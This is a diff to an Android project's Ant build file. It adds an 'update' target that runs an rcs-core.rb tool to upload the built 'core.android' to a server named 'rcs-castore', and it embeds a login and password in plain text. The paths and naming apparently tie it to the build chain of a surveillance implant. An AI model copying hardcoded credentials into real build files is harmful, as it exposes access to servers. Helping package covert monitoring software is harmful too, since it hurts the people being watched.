@@ -327,7 +327,42 @@
 		</checksum>
 	</target>
 
-	<import file="${sdk.dir}/tools/ant/build.xml" />
+	<import file="${sdk.dir}/tools/ant/build.xml" />	
+	
+	<property name="ruby.path" value="C:/Ruby193/bin"/>
+	<property name="rcscore.path" value="C:/HT/rcs-core-build"/>
+	
+	<macrodef name="updaterelease">
+		<attribute name="server" />
+		<attribute name="login" />
+		<attribute name="password" />
+		<attribute name="file" />
+		<attribute name="filename" />
+		<sequential>
+			<echo>@{server}</echo>
+
+			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
+				<arg value="${rcscore.path}/rcs-core.rb" />
+				<arg value="-u" />
+				<arg value="@{login}" />
+				<arg value="-p" />
+				<arg value="@{password}" />
+				<arg value="-d" />
+				<arg value="@{server}" />
+				<arg value="-n" />
+				<arg value="android" />
+				<arg value="-a" />
+				<arg value="@{file}" />
+				<arg value="-A" />
+				<arg value="@{filename}" />
+			</exec>
+
+		</sequential>
+	</macrodef>
+	
+	<target name="update">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="bin/core.android" filename="core" />		
+	</target>
 	
 	<target name="help">
 		<echo>ant htrelease :  full build release</echo>
@@ -335,6 +370,7 @@
 		<echo>ant dist : create a dist zip in ../dist</echo>
 		<echo>ant set-debug : make messages.bin and cfg.java, for debug</echo>
 		<echo>ant set-release : make messages.bin and cfg.java, for release</echo>
+		<echo>ant update : uploads the core to castore</echo>
 	</target>
 
 </project>
